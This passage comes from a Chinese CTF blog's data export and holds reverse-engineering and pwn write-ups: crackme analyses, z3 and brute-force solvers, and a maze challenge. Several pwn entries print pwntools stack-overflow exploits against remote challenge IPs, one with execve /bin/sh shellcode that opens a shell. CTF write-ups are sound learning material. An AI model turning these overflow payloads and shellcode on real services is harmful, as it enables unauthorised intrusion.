= pp.posix.files[0].all_bytes() # 取输入的变量 print pp.solver.eval(inp,cast_to = str) # 利用约束求解引擎求解输入","categories":[],"tags":[]},{"title":"MOCTF-1","slug":"MOCTF-1","date":"2018-10-31T13:25:57.000Z","updated":"2019-01-12T14:48:38.298Z","comments":true,"path":"2018/10/31/MOCTF-1/","link":"","permalink":"http://yoursite.com/2018/10/31/MOCTF-1/","excerpt":"","text":"SO EASY虽然程序很大，但是在main函数里直接可以看见flag。 跳跳跳还是🎲游戏，千篇一律，nop掉判断就好了,最后给出的字符串base64解密得到flag。 暗恋的苦恼给了加密程序，密文，密钥，要推算出明文。 ida打开，定位到加密函数： 123456789101112v7 = strlen(a1);v6 = strlen(a2);v4 = 0;v3 = operator new(0xFFu);for ( i = 0; i &lt; v7; ++i )&#123; if ( v4 == v6 ) v4 = 0; v3[i] = sub_401005(a1[i], a2[v4++]);&#125;v3[i] = 0;return v3; 每一位密钥对每一位明文操作，当密钥用完时从头再取。sub_401005: 1234567891011v4 = toupper(a1);v5 = toupper(a2);if ( v4 == &apos; &apos; ) return v4;for ( i = 0; i &lt; v4 - 65; ++i ) ++v5;if ( v5 &gt; 90 ) result = v5 - 25;else result = v5;return result; toupper是转换为大写。v5+=v4-65，然后根据v5的值决定返回值。然而不知道 1234if ( v5 &gt; 90 ) result = v5 - 25;else result = v5; 这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333: 1234567891011121314mingwen=&quot;&quot;miwen=&quot;QWDRILDWNTW&quot;miyao=&quot;ILOVEMOCTF&quot;for i in range(len(miwen)): v5=ord(miwen[i]) v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwenmingwen=&quot;&quot;for i in range(len(miwen)): v5=ord(miwen[i])+25 v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwen crakeme2简单的异或，逆运算得到一串十六进制数字，ascii得到flag。 you get flag ， but it … -1s？XD easy pwn栈溢出： 1234char s; // [esp+4h] [ebp-14h]gets(&amp;s);return puts(&amp;s); 后门函数： 123456789101112131415161718.text:0804850B public success.text:0804850B success proc near.text:0804850B ; __unwind &#123;.text:0804850B push ebp.text:0804850C mov ebp, esp.text:0804850E sub esp, 8.text:08048511 sub esp, 0Ch.text:08048514 push offset s ; &quot;you success gets flag&quot;.text:08048519 call _puts.text:0804851E add esp, 10h.text:08048521 sub esp, 0Ch.text:08048524 push offset command ; &quot;cat flag&quot;.text:08048529 call _system.text:0804852E add esp, 10h.text:08048531 nop.text:08048532 leave.text:08048533 retn.text:08048533 ; &#125; // starts at 804850B 脚本： 1234567from pwn import *sh=remote(&quot;139.199.177.55&quot;,10001)sh.recvuntil(&quot;easy?\\n&quot;)system=0x0804850bpayload=&apos;a&apos;*0x18+p32(0x0804850b)sh.sendline(payload)sh.interactive()","categories":[],"tags":[]},{"title":"MCTF2018-2","slug":"MCTF2018-2","date":"2018-10-30T15:15:37.000Z","updated":"2018-10-31T07:51:29.619Z","comments":true,"path":"2018/10/30/MCTF2018-2/","link":"","permalink":"http://yoursite.com/2018/10/30/MCTF2018-2/","excerpt":"","text":"identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109v17 = xmmword_402210; v18 = xmmword_402200; v2 = &quot;WELCOME TO MCTF\\n&quot;; v19 = xmmword_402220; v3 = aWelcomeToMctf[0]; v23 = 0xF5; v25 = 0; v20 = xmmword_4021F0; v21 = xmmword_402240; v22 = xmmword_402230; for ( i = 0i64; *v2; v3 = *v2 ) &#123; putchar(v3); ++v2; fflush(0); Sleep(0x64u); &#125; if ( a2 == 3 ) &#123; sub_401040(&quot;~checking:&quot;); sub_401080(); v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;); if ( v5 ) v5 = -(v5 &lt; 0) | 1; if ( v5 ) &#123; sub_401040(&quot;Incorrect username\\n&quot;); sub_401010(&quot;fail\\n&quot;); system(&quot;pause&quot;); &#125; sub_401040(&quot;\\nCorrect Username\\n&quot;); v6 = *(const char **)(a3 + 8); v7 = 0; if ( strlen(v6) ) &#123; do &#123; v9 = v7 &amp; 0x80000001; v8 = (v7 &amp; 0x80000001) == 0; if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 ) &#123; v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE; v8 = v10 == -1; v9 = v10 + 1; &#125; if ( v8 ) &#123; if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) ) &#123; v11 = &quot;\\nIncorrect password\\n&quot;; v12 = 10; do &#123; putchar(v12); ++v11; fflush(0); Sleep(0x64u); v12 = *v11; &#125; while ( *v11 ); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; &#125; else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) ) &#123; sub_401040(&quot;\\nIncorrect password\\n&quot;); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; ++v7; &#125; while ( v7 &lt; strlen(v6) ); &#125; v13 = &quot;~checking:&quot;; v14 = 126; do &#123; putchar(v14); ++v13; fflush(0); Sleep(0x64u); v14 = *v13; &#125; while ( *v13 ); sub_401080(); v15 = &quot;\\nCongratulations!\\n&quot;; v16 = 10; do &#123; putchar(v16); ++v15; fflush(0); Sleep(0x64u); v16 = *v15; &#125; while ( *v15 ); sub_401010(&quot;success\\n&quot;);LABEL_25: system(&quot;pause&quot;); result = 0; &#125; else &#123; sub_401010(&quot;[ERROR] Login information missing\\n&quot;); sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\\n&quot;, *(_DWORD *)a3); result = 1; &#125; return result; 显然用户名是Mirage，而密码就需要进行异或运算了。 密码下标为偶数的部分异或0x88后与固定字符串相等。 密码下标为奇数的部分异或0x66后与固定字符串相等。 逆运算脚本如下： 12345678key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]flag=&quot;&quot;for i in range(len(key)): if i&amp;1 == 0: flag+=chr(key[i]^0x88) if i&amp;1 == 1: flag+=chr(key[i]^0x66)print flag 吃鲨鱼peid看了一下发现是c#，拖进dnspy： 123456789101112131415161718192021222324252627282930313233343536373839404142434445private void button1_Click(object sender, EventArgs e) &#123; string text = this.textBox1.Text; string[] array = new string[] &#123; &quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;, &quot;0d61f8370cad1d412f80b84d143e1257&quot;, &quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;, &quot;800618943025315f869e4e1f09471012&quot;, &quot;f95b70fdc3088560732a5ac135644506&quot;, &quot;4a8a08f09d37b73795649038408b5f33&quot;, &quot;03c7c0ace395d80182db07ae2c30f034&quot;, &quot;2510c39011c5be704182423e3a695e91&quot;, &quot;0cc175b9c0f1b6a831c399e269772661&quot;, &quot;4b43b0aee35624cd95b910189b3dc231&quot;, &quot;83878c91171338902e0fe0fb97a8c47a&quot;, &quot;b14a7b8059d9c055954c92674ce60032&quot;, &quot;6f8f57715090da2632453988d9a1501b&quot;, &quot;8277e0910d750195b448797616e091ad&quot;, &quot;e4da3b7fbbce2345d7772b0674a318d5&quot;, &quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot; &#125;; if (text.Length &gt; 16) &#123; this.label2.Text = &quot;You are wrong!&quot;; return; &#125; for (int i = 0; i &lt; text.Length; i++) &#123; char[] array2 = new char[] &#123; &apos;H&apos; &#125;; array2[0] = text[i]; string str = new string(array2); if (array[i].CompareTo(Form1.fivefive(str)) != 0) &#123; this.label2.Text = &quot;You are wrong!&quot;; &#125; else &#123; this.label2.Text = &quot;You are right!&quot;; &#125; &#125; &#125; 找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。 Math for kids","categories":[],"tags":[]},{"title":"MCTF2018-1","slug":"MCTF2018-1","date":"2018-10-27T05:18:44.000Z","updated":"2018-10-30T15:15:21.837Z","comments":true,"path":"2018/10/27/MCTF2018-1/","link":"","permalink":"http://yoursite.com/2018/10/27/MCTF2018-1/","excerpt":"","text":"hello helloida打开： 123456789101112131415161718192021222324252627282930mov [rbp+s2], 4Dh ; &apos;M&apos;mov [rbp+var_5F], 43h ; &apos;C&apos;mov [rbp+var_5E], 54h ; &apos;T&apos;mov [rbp+var_5D], 46h ; &apos;F&apos;mov [rbp+var_5C], 7Bh ; &apos;&#123;&apos;mov [rbp+var_5B], 77h ; &apos;w&apos;mov [rbp+var_5A], 65h ; &apos;e&apos;mov [rbp+var_59], 31h ; &apos;1&apos;mov [rbp+var_58], 63h ; &apos;c&apos;mov [rbp+var_57], 6Fh ; &apos;o&apos;mov [rbp+var_56], 6Dh ; &apos;m&apos;mov [rbp+var_55], 65h ; &apos;e&apos;mov [rbp+var_54], 5Fh ; &apos;_&apos;mov [rbp+var_53], 32h ; &apos;2&apos;mov [rbp+var_52], 6Fh ; &apos;o&apos;mov [rbp+var_51], 5Fh ; &apos;_&apos;mov [rbp+var_50], 52h ; &apos;R&apos;mov [rbp+var_4F], 65h ; &apos;e&apos;mov [rbp+var_4E], 76h ; &apos;v&apos;mov [rbp+var_4D], 65h ; &apos;e&apos;mov [rbp+var_4C], 72h ; &apos;r&apos;mov [rbp+var_4B], 73h ; &apos;s&apos;mov [rbp+var_4A], 65h ; &apos;e&apos;mov [rbp+var_49], 5Fh ; &apos;_&apos;mov [rbp+var_48], 57h ; &apos;W&apos;mov [rbp+var_47], 6Fh ; &apos;o&apos;mov [rbp+var_46], 72h ; &apos;r&apos;mov [rbp+var_45], 31h ; &apos;1&apos;mov [rbp+var_44], 64h ; &apos;d&apos;mov [rbp+var_43], 7Dh ; &apos;&#125;&apos; drink coffeeluyten打开，check函数： 123456789101112131415161718192021222324public static boolean CHECK(final int input) &#123; if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123; int v7 = 1; int v8 = 10000000; int v9 = 1; if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123; for (int v10 = 0; v10 &lt; 4; ++v10) &#123; if (input / v7 % 10 != input / v8 % 10) &#123; v9 = 0; break; &#125; v7 *= 10; v8 /= 10; &#125; if (v9 != 1) &#123; return false; &#125; if (v9 == 1) &#123; return true; &#125; &#125; &#125; return false; &#125; 本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。只好不用z3，魔改了原代码求passwd： 12345678910111213for i in range(10000000,99999999): v7 = 1 v8 = 10000000 v9 = 1 if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0): for j in range(4): if (i / v7 % 10 != i / v8 % 10): v9 = 0 break v7 *= 10 v8 /= 10 if (v9 == 1): print i 运行后打印出passwd，输入后得到flag。 听说你是萌新一张jpg，hexfiend打开在文件末尾得到flag。 不如…一张png，binwalk看一下： 1234DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced830060 0xCAA6C End of Zip archive 发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。 猜猜flag走后门吗有后门函数直接可以开shell，直接栈溢出覆盖返回地址： 1234567from pwn import *sh=remote(&quot;123.206.131.120&quot;,10001)backdoor_add=0x4006e0sh.recv()payload=&quot;a&quot;*0x58+p64(backdoor_add)sh.sendline(payload)sh.interactive() 后门？不存在的和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode： 123456789from pwn import *sh=remote(&quot;123.206.131.120&quot;,10002)sh.recvuntil(&quot;is&quot;)sh.recv(3)add=int(sh.recv(12),16)shellcode=&quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot;payload=shellcode+&apos;\\x90&apos;*(0x58-len(shellcode))+p64(add)sh.sendline(payload)sh.interactive() 做出了后门也不给你走","categories":[],"tags":[]},{"title":"sus-gccc","slug":"sus-gccc","date":"2018-10-25T13:51:39.000Z","updated":"2018-11-20T13:03:12.974Z","comments":true,"path":"2018/10/25/sus-gccc/","link":"","permalink":"http://yoursite.com/2018/10/25/sus-gccc/","excerpt":"","text":".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCCC&#123; // Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458 public static void Main() &#123; Console.Write(&quot;Input the key: &quot;); uint num; if (!uint.TryParse(Console.ReadLine().Trim(), out num)) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; string text = &quot;&quot;; string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;; int num2 = 0; byte[] array = new byte[] &#123; 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46 &#125;; byte b = 0; while (num != 0u) &#123; char c = (char)(array[num2] ^ (byte)num ^ b); if (!text2.Contains(new string(c, 1))) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; text += c; b ^= array[num2++]; num &gt;&gt;= 1; &#125; if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; Console.WriteLine(&quot;Your flag is: &quot; + text); &#125;&#125; 定义了uint类型变量num，text[i]=array[i]^(num&amp;0xff)^b，b=array[0]^...^array[i]，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from z3 import *num=BitVec(&quot;num&quot;,33)array=[ 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46]b=range(32)for i in range(32): temp=0 for j in range(i): temp^=array[j] b[i]=tempsolver=Solver()solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;))solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))for i in range(5,31): solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=126) solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=32)solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))if solver.check()==sat : print solver.model()right_num=3658134498flag=&quot;&quot;for i in range(32): flag+=chr(array[i]^((right_num&gt;&gt;i)&amp;0xff)^b[i])print flag","categories":[],"tags":[]},{"title":"实验吧-3","slug":"实验吧-3","date":"2018-10-24T10:40:16.000Z","updated":"2018-11-20T10:05:40.278Z","comments":true,"path":"2018/10/24/实验吧-3/","link":"","permalink":"http://yoursite.com/2018/10/24/实验吧-3/","excerpt":"","text":"逆向观察直接拖ida里打开，主函数： 12345678910111213141516171819202122232425 v10 = __readfsqword(0x28u); if ( argc &lt;= 1 ) &#123; puts(&quot;usage ./rev50 password&quot;); &#125; else &#123; src = &apos;sedecrem&apos;; v6 = 0; v7 = 0; v8 = 0; memcpy(&amp;dest, &amp;src, 9uLL); for ( i = 0; i &lt;= 999; ++i ) &#123; if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) ) &#123; puts(&quot;Good password ! &quot;); goto LABEL_10; &#125; &#125; puts(&quot;Bad ! password&quot;); &#125;LABEL_10: puts(&amp;byte_40252A); return 0; Good password的判断条件就是输入=src，需要注意的是这里的字符串是应该倒过来看的，所以应该是mercedes。 bitwise下载下来一个rar，解压后可以得到一个java程序和一个py程序，看上去应该功能是一样的，不会java所以就分析py吧： 1234567891011121314151617181920212223#!/usr/bin/env pythonuser_submitted = raw_input(&quot;Enter Password: &quot;)if len(user_submitted) != 10: print &quot;Wrong&quot; exit()verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]user_arr = []for char in user_submitted: # &apos;&lt;&lt;&apos; is left bit shift # &apos;&gt;&gt;&apos; is right bit shift # &apos;|&apos; is bit-wise or # &apos;^&apos; is bit-wise xor # &apos;&amp;&apos; is bit-wise and user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )if (user_arr == verify_arr): print &quot;Success&quot;else: print &quot;Wrong&quot; 爆破一发： 12345678import stringflag=&quot;&quot;verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]for i in range(len(verify_arr)): for j in string.printable: if (((ord(j) &lt;&lt; 5) | (ord(j) &gt;&gt; 3)) ^ 111) &amp; 255 == verify_arr[i] : flag+=jprint flag Byte Code下载得到一个.class文件，用jd-gui试试,结果会报错INTERNAL ERROR，百度了一下,用luyten试试打开了： 12345678910111213141516171819202122232425import java.io.*;class Authenticator&#123; public static char[] key; public static void main(final String[] array) &#123; (Authenticator.key = new char[10])[0] = &apos;A&apos;; Authenticator.key[1] = &apos;o&apos;; Authenticator.key[2] = &apos;J&apos;; Authenticator.key[3] = &apos;k&apos;; Authenticator.key[4] = &apos;V&apos;; Authenticator.key[5] = &apos;h&apos;; Authenticator.key[6] = &apos;L&apos;; Authenticator.key[7] = &apos;w&apos;; Authenticator.key[8] = &apos;U&apos;; Authenticator.key[9] = &apos;R&apos;; final Console console = System.console(); for (String line = &quot;&quot;; !line.equals(&quot;ThisIsth3mag1calString4458&quot;); line = console.readLine(&quot;Enter password:&quot;, new Object[0])) &#123;&#125; for (int i = 0; i &lt; Authenticator.key.length; ++i) &#123; System.out.print(Authenticator.key[i]); &#125; System.out.println(&quot;&quot;); &#125;&#125; 虽然不会java但是这么简单的代码还是可以看看的，AoJkVhLwUR就是输入正确时得到的flag。（luyten真给力啊 CFG to C汇编代码和c代码配对就行了，不过其实根据逻辑图就能判断。 对应 1234567int loop(int a) &#123; while (a &gt;= 0) &#123; a--; &#125; return a; &#125; 对应 12345678int control(int a, int b) &#123; if (a &gt; b) return b; else return a; &#125; 对应 12345678int for_loop(int a, int b, int c) &#123; int i; for(i = 0; i &lt; b; i++) a = c + i; return a; &#125; 对应 1234int modulo(int a, int b) &#123; return b % a; &#125; catalyst-systemida打开，main函数中关键部分： 1234567891011121314151617181920printf(&quot;Username: &quot;);__isoc99_scanf(&quot;%s&quot;, v8);printf(&quot;Password: &quot;, v8);__isoc99_scanf(&quot;%s&quot;, v7);printf(&quot;Logging in&quot;, v7);fflush(stdout);for ( j = 0; j &lt;= 29; ++j )&#123; v5 = rand(); sleep(v5 % (j + 1)); putchar(&apos;.&apos;); fflush(stdout);&#125;putchar(10);sub_400C9A((__int64)v8);sub_400CDD(v8);sub_4008F7((__int64)v8);sub_400977(v8, v7);sub_400876((__int64)v8, (__int64)v7);return 0LL; 输入账号密码后接下来几个函数进行账号密码验证与输出flag。 sub_400876就是输出flag的函数： 1234567char *s; // [rsp+0h] [rbp-30h]int i; // [rsp+1Ch] [rbp-14h]printf(&quot;your flag is: ALEXCTF&#123;&quot;, a2, a1);for ( i = 0; i &lt; strlen(s); ++i ) putchar((unsigned __int8)byte_6020A0[i] ^ s[i]);return puts(&quot;&#125;&quot;); 可以看见flag的格式了，不过不知道s处的字符串是啥，只能看看上面的函数。 sub_400c9a限制了账号的长度大于8小于16且为4的倍数，所以长度就是12。 sub_400cdd函数： 1234567891011v4 = *a1;v3 = a1[1];v2 = a1[2];if ( v4 - v3 + v2 != 0x5C664B56 || v3 + 3 * (v2 + v4) != 0x2E700C7B2LL || (result = 0x32AC30689A6AD314LL, v2 * v3 != 0x32AC30689A6AD314LL) )&#123; puts(&quot;invalid username or password&quot;); exit(0);&#125;return result; 对账号进行了限制，给了三个条件表达式，这里可以使用z3求解,解得v4=0x6f65635f，v3=0x7473796c,v2=0x61746163。 sub_4008fc函数限制了账号的字符位于’`’与’z’之间或者等于’_’。 sub_400977通过随机函数生成密码，这里要用linux运行才是正确的。 sub_400876密码异或一个数组得到flag。","categories":[],"tags":[]},{"title":"实验吧-2","slug":"实验吧-2","date":"2018-10-23T09:14:59.000Z","updated":"2018-10-26T16:11:24.609Z","comments":true,"path":"2018/10/23/实验吧-2/","link":"","permalink":"http://yoursite.com/2018/10/23/实验吧-2/","excerpt":"","text":"有一个程序加密得到如下密文又是pyc文件，反编译之后： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889# 2018.10.23 17:05:34 CST# Embedded file name: ./rev200.pyimport sysfrom hashlib import md5import base64from time import timefrom datetime import datetimeUC_KEY = &apos;123456789&apos;def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0): ckey_length = 4 if key == &apos;&apos;: key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest() else: key = md5(key.encode(&apos;utf-8&apos;)).hexdigest() keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest() keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest() if ckey_length == 0: keyc = &apos;&apos; elif operation == &apos;DECODE&apos;: keyc = string[0:ckey_length] elif operation == &apos;ENCODE&apos;: keyc = md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:] else: return cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest() key_length = len(cryptkey) if operation == &apos;DECODE&apos;: string = base64.b64decode(string[ckey_length:]) elif operation == &apos;ENCODE&apos;: if expiry == 0: string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: return string_length = len(string) result = &apos;&apos; box = range(256) rndkey = [0] * 256 for i in range(256): rndkey[i] = ord(cryptkey[i % key_length]) j = 0 for i in range(256): j = (j + box[i] + rndkey[i]) % 256 tmp = box[i] box[i] = box[j] box[j] = tmp a = j = 0 for i in range(string_length): a = (a + 1) % 256 j = (j + box[a]) % 256 tmp = box[a] box[a] = box[j] box[j] = tmp result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256]) if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos; else: return keyc + base64.b64encode(result)if __name__ == &apos;__main__&apos;: if len(sys.argv) &lt; 3: exit(1) ex = 20 for i in range(1, len(sys.argv), 2): a = sys.argv[i] b = sys.argv[i + 1] if a == &apos;-t&apos;: ex = int(b) elif a == &apos;-e&apos;: encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex) print encoded elif a == &apos;-d&apos;: decoded = authcode(b, &apos;DECODE&apos;, expiry=ex) print decoded# okay decompyling reverse300.pyc # decompiled 1 files: 1 okay, 0 failed, 0 verify failed# 2018.10.23 17:05:34 CST 要求是输入至少3个参数，第一个输入-d的话就是解密，第二个参数就输入题目给的字符串就行了，不知道第三个参数该输入啥，直接把if len(sys.argv) &lt; 3: exit(1)给nop掉了。 运行发现程序没有结果，可能是解密函数出了一些问题： 12345678910if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos;else: return keyc + base64.b64encode(result) 最里面的return result[26:]可能就是正确结果，把所有return替换成这个之后运行得到flag。 Keylead（ASIS CTF 2015）下载下来是个7z文件，后缀改为7z解压后用ida打开，从主函数发现是一个掷🎲小游戏，和上一篇里的🎲要求掷的数字也是一样的，不过这个要用gdb调试，无奈gdb鶸，只能用ida看看输出flag的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197 v11 = 0; v7 = 0; while ( v11 != 1 ) &#123; putchar(byte_601680[14 * v11++]); do &#123; while ( v7 &lt;= 1 ) putchar(byte_601680[20 * v11 - 8 * v7++]); v1 = v7 + 1; v2 = 3 * v11; putchar(byte_601680[2 * v2 + 11 + v1]); v2 *= 5; v8 = v1 - 1; putchar(byte_601680[2 * v2 + v8]); v12 = v2 / 3; while ( 1 ) &#123; while ( 1 ) &#123;LABEL_12: if ( !v8 ) &#123; putchar(byte_601680[2 * v12]); v15 = v12 ^ 2; while ( 2 ) &#123; for ( i = 1; i &lt;= 9; ++i ) putchar(byte_601680[10 * (i % 2) + 3 + v15]); v13 = v15 + 1;LABEL_44: putchar(byte_601680[v13 / 3]); if ( i == 10 ) &#123; v13 += 2 * v13 + 13; i = 19; goto LABEL_33; &#125; if ( i == 2 ) &#123; i = v13-- + 2; goto LABEL_4; &#125; if ( (unsigned int)(i - 22) &lt;= 0xA ) &#123; v14 = v13 - 3; for ( j = i - v14; ; j = 8 ) &#123;LABEL_58: putchar(byte_601680[v14 + 1]); v16 = v14 + 1; if ( j == 11 ) &#123; v13 = (v16 + 14) / 2; i = 11 * (v13 / 6); goto LABEL_44; &#125; if ( j != 13 ) break; v12 = v16 + 8; v8 = 2;LABEL_51: while ( 2 ) &#123; putchar(byte_601680[v12 - 10]); if ( v8 == v12 ) &#123; v4 = v8 + 2; v5 = v12 + 2; putchar(byte_601680[v5 / 2 + v4 / 5]); i = v4 / 2; putchar(byte_601680[i / 5 + v5]); v13 = v5 + i - 1 + v5; while ( 1 ) &#123;LABEL_33: putchar(byte_601680[v13 - 19]); if ( i == 2 ) &#123; v3 = v13 + 1; putchar(byte_601680[v3 / 2 - 3]); v13 = v3 / 5 + 2; i = 2; goto LABEL_44; &#125; if ( i &lt;= 2 ) break; if ( i == 10 ) &#123; v12 = v13 - 31; v8 = 9; goto LABEL_51; &#125; if ( i != 19 ) goto LABEL_44; i = 2; &#125; if ( i == 1 ) &#123; v8 = 17; v12 = v13 % 5 - 17 + v13;LABEL_20: putchar(byte_601680[v12 - v8 + 9]); v12 += ~v8++; continue; &#125; goto LABEL_44; &#125; break; &#125; if ( v8 != 9 ) &#123; if ( v8 != 2 ) goto LABEL_12; j = 2; v16 = v12 - 18;LABEL_64: v6 = 9 * j; putchar(byte_601680[v16 / 2 + v6 + v6 % 10]); v11 = v16 + 1; v7 = v6 % 10; goto LABEL_21; &#125; putchar(byte_601680[v12 - 16]); v14 = v12 / 2; &#125; if ( j == 8 ) &#123; v15 = v16 + 1; i = 7; continue; &#125; goto LABEL_64; &#125; goto LABEL_4; &#125; &#125; if ( v8 == 2 ) break; if ( v12 == 7 ) &#123; putchar(byte_601680[21 - v8]); v13 = 49; i = v8 / 3; goto LABEL_33; &#125; if ( v8 != 3 ) goto LABEL_20; putchar(byte_601680[2 * (v12 / 3)]); v13 = v12 / 3; i = 9; do &#123; while ( 1 ) &#123; if ( v13 == 10 ) &#123; putchar(byte_601680[i + 8]); v14 = 9; j = i + 1; goto LABEL_58; &#125; if ( v13 == 11 ) &#123; putchar(byte_601680[i / 7]); v13 = i-- - 11; &#125;LABEL_4: if ( i != 9 ) break; putchar(byte_601680[v13 * v13 + 7]); v13 = v13 * v13 + 1; i = 10; &#125; &#125; while ( i != 13 ); putchar(byte_601680[2 * v13 + 12]); v8 = 3; v12 = 3 * v13; &#125; putchar(byte_601680[3 * v12 + 1]); v0 = v12 * v12; putchar(byte_601680[v0 - 15]); v11 = v0 - 15; v7 = 4; putchar(byte_601680[4]);LABEL_21: if ( v7 != 4 ) break; putchar(byte_601680[v11 + 6]); v12 = v11 - 3; v8 = 3; &#125; &#125; while ( v7 != 8 ); putchar(byte_601680[2 * v11 + 32]); &#125; …有点烦，还是先学习下gdb吧。 学习后发现用ida远程调试就可以了，并不一定要用gdb，调试时把所有跳转到失败情况的jle之类的nop掉，这样运行到最后就会输出flag了。 分道扬镳题目说是一个迷宫，ida打开，用字符串查看地图： 12345678********* * ** * ** ** * ** ** * #* ** **** ** ********* 找到调用这个地图的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 v5 = 0; memset(&amp;v6, 0, 0x74u); v7 = 0; v8 = 0; strcpy(&amp;v2, &quot;********* * ** * ** ** * ** ** * #* ** **** ** 